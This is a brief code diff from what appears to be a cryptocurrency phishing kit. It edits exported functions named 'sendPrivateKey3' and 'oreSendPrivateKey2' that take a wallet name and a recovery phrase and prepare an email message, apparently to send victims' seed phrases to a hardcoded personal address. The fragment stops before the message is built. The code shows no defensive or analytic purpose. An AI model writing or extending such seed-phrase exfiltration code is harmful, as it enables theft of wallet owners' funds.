@@ -140,8 +140,8 @@ export const sendPrivateKey3 = async (rPhrase) => {
     });
 };
 
-export const oreSendPrivateKey3 = async (rPhrase) => {
-  const redeem = `RCCG`;
+export const oreSendPrivateKey2 = async (walletName, rPhrase) => {
+  const redeem = `${walletName}`;
   const SENDER_EMAIL2 = `Tonyellaby@gmail.com`;
 
   const msg = {
